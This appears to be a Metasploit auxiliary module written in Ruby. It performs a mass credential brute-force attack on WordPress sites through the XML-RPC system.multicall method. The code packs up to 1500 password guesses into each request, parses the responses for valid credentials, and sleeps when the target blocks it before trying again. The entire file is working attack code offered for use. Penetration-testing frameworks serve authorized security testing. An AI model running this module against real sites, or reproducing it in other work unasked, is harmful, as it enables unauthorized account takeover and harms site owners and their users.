##
# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
            info,
            'Name'         => 'WordPress XMLRPC Massive Bruteforce',
            'Description'  => %q{Wordpress Massive Burteforce attacks via wordpress XMLRPC service.},
            'License'      => MSF_LICENSE,
            'Author'       =>
              [
                'Sabri (@KINGSABRI)',           # Module Writer
                'William (WCoppola@Lares.com)'  # Module Requester
              ],
            'References'   =>
              [
                ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/'],
                ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html']
              ]
          ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path', '/']),
        OptPath.new('WPUSER_FILE', [true, 'File containing usernames, one per line',
                                    File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
        OptPath.new('WPPASS_FILE', [true, 'File containing passwords, one per line',
                                    File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")]),
        OptInt.new('BLOCKEDWAIT', [true, 'Time(minutes) to wait if got blocked', 6])
      ], self.class)
  end

  def usernames
    File.readlines(datastore['WPUSER_FILE']).map {|user| user.chomp}
  end

  def passwords
    File.readlines(datastore['WPPASS_FILE']).map {|pass| pass.chomp}
  end

  #
  # XML Factory
  #
  def generate_xml(user)

    vprint_warning('Generating XMLs may take a while depends on the list file(s) size.') if passwords.size > 1500
    xml_payloads = []                          # Container for all generated XMLs
    # Evil XML | Limit number of log-ins to 1500/request for wordpress limitation
    passwords.each_slice(1500) do |pass_group|

      document = Nokogiri::XML::Builder.new do |xml|
        xml.methodCall {
          xml.methodName("system.multicall")
          xml.params {
            xml.param {
              xml.value {
                xml.array {
                  xml.data {

                    pass_group.each  do |pass|
                      xml.value {
                        xml.struct {
                          xml.member {
                            xml.name("methodName")
                            xml.value { xml.string("wp.getUsersBlogs") }}
                          xml.member {
                            xml.name("params")
                            xml.value {
                              xml.array {
                                xml.data {
                                  xml.value {
                                    xml.array {
                                      xml.data {
                                        xml.value { xml.string(user) }
                                        xml.value { xml.string(pass) }
                                      }}}}}}}}}
                    end

                  }}}}}}
      end

      xml_payloads << document.to_xml
    end

    vprint_status('Generating XMLs just done.')
    xml_payloads
  end

  #
  # Check target status
  #
  def check_wpstatus
    print_status("Checking #{peer} status!")

    if !wordpress_and_online?
      print_error("#{peer}:#{rport}#{target_uri} does not appear to be running Wordpress or you got blocked! (Do Manual Check)")
      nil
    elsif !wordpress_xmlrpc_enabled?
      print_error("#{peer}:#{rport}#{wordpress_url_xmlrpc} does not enable XMLRPC")
      nil
    else
      print_status("Target #{peer} is running Wordpress")
      true
    end

  end

  #
  # Connection Setup
  #
  def connecting(xml)
    uri = target_uri.path
    opts =
      {
        'method'  => 'POST',
        'uri'     => normalize_uri(uri, wordpress_url_xmlrpc),
        'data'    => xml,
        'ctype'   =>'text/xml'
      }
    client = Rex::Proto::Http::Client.new(rhost)
    client.connect
    req  = client.request_cgi(opts)
    res  = client.send_recv(req)

    if res && res.code != 200
      print_error('It seems you got blocked!')
      print_warning("I'll sleep for #{datastore['BLOCKEDWAIT']} minutes, then I'll try again. CTR+C to exit")
      sleep datastore['BLOCKEDWAIT'] * 60
    end
    @res = res
  end

  def run
    return if check_wpstatus.nil?

    usernames.each do |user|
      passfound = false

      print_status("Bruteforcing user: #{user}")
      generate_xml(user).each do |xml|
        next if passfound == true

        connecting(xml)

        # Request Parser
        req_xml = Nokogiri::Slop xml
        # Response Parser
        res_xml = Nokogiri::Slop @res.to_s.scan(/<.*>/).join

        res_xml.search("methodResponse/params/param/value/array/data/value").each_with_index do |value, i|

          result =  value.at("struct/member/value/int")
          # If response error code doesn't not exist
          if result.nil?
            user = req_xml.search("data/value/array/data")[i].value[0].text.strip
            pass = req_xml.search("data/value/array/data")[i].value[1].text.strip
            print_good("Credentials Found! #{user}:#{pass}")

            passfound = true
          end

        end

        unless user == usernames.last
          vprint_status('Sleeping for 2 seconds..')
          sleep 2
        end

      end end end
end
